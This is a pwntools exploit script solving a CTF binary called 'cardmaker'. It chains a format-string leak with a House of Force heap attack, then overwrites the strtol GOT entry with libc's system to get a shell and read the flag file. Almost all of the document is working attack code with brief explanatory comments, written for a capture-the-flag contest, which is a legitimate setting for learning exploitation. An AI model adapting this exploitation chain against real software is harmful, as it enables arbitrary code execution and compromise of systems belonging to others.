from pwn import *
from time import sleep
import numpy as np
'''
this is a format string leak combined with house of force heap exploitation.
You control the amount of memory allocated. So allocating very little space,
then a lot (calculated), then again will allow you to get a pointer to read/write
anywhere you want!

Steps:
    1. Make a card of size 4294967295 with the border %x
    2. Send it to yourself! Need the stack leaks to get the top ptr
    3. Overwrite top chunk size with very large number (-1 or so)
    5. Calculate the amount to allocate for the final malloc to return the desired place
    6. Make a card of the correct size to reach strtol
    7. Allocate two new cards with no contents. The first will fill the space from the memory allocated in sending and reused because fastbins
    8. Print card to get libc leak... I think there is also a ptr leaked in the card from step 2
    9. Calculate system offset
    10. Overwrite strtol with system
    11. Send yourself the flag!

Run script with REMOTE as an arg to run on the remote server. Specify NOPTRACE to disable debugging
'''

def card(p, contents, length=None, ip=args.get("IP", "127.0.0.1"), port=args.get("PORT", 8080), author="/bin/sh", recip="mom", border="%x"):
    p.sendline("1")
    p.sendline(author)
    p.sendline(recip)
    p.sendline(ip + ":" + str(port))
    p.sendline(border)
    if length is None:
        length = len(contents)
    p.sendline(str(length))
    if length != 0:
        p.sendline(str(contents))
        if length != len(contents):
            p.sendline("done.")

# cuts out the heap leak because I totally forgot about %p
def cutout(s, first, second):
    fi = s.find(first) + len(first)
    se = s.find(second, fi) + len(second)
    return s[fi:se]

def main():
    e = ELF("./cardmaker")
    libc = ELF("libc-2.23.so")
    context.arch = e.arch
    if args['REMOTE']:
        p = remote('cardmaker.ctf.rc3.club', 9887)
    else:
        p = process(e.path)
        gdb.attach(p, "b cardmaker.c:218")

    # for getting card
    l = listen(int(args.get("PORT", 8080)), args.get("IP", "127.0.0.1"), timeout=5)

    # make card, get leak
    card(p, "", length=0)
    p.sendline("5")
    l.wait_for_connection()
    cbuf = l.recvall()
    heap_addr = int(cutout(cbuf, "80", "050"), 16) + 48
    l.close()
    log.success("Heap addr: " + hex(heap_addr))

    # calculate size required to get to strtol... it's not exact due to other allocations
    evil_size = np.uint32(e.sym['got.strtol'] - 16 - heap_addr - 64)
    log.success("Evil size: " + hex(evil_size))

    # allocate card to overwrite top chunk size
    card(p, cyclic(24) + p64(np.uint64(-1)), length=4294967295)

    # allocate card of evil size so the next pointer malloc returns points to strtol
    card(p, "papa bless", length=evil_size)

    # one card to fill the fastbin
    card(p, "", length=0, ip="123")

    # and another with contents pointing to strtol
    card(p, "", length=0, ip="123")

    # lets view that card to leak strtol's address
    p.sendline("2")
    p.sendline("5")
    p.recvuntil("Contents: ")
    leak_buf = p.recvuntil("\n")[:-1]
    while len(leak_buf) != 8:
        leak_buf += '\x00'
    leak = u64(leak_buf)

    # calculate libc base and system
    libc.address = leak - libc.symbols['strtol']
    log.success("strtol: " + str(hex(leak)))
    log.success("libc base: " + hex(libc.address))
    log.success("system: " + hex(libc.symbols['system']))

    # change the card contents to system
    p.sendline("3")
    p.sendline("5")
    p.sendline(p64(libc.symbols['system']))
    p.recvrepeat(.5)

    # now we have a prompt!
    p.sendline("id")
    res = p.recvline()
    if "uid" in res:
        log.success(res)
        log.success("Winner!")
    else:
        log.error("No shell :(")
        return

    # get the flag
    p.recvuntil("Choice: ")
    p.sendline("cat /home/cardmaker/flag.txt")
    log.success("FLAG: " + p.recvline())

if __name__ == '__main__':
    main()
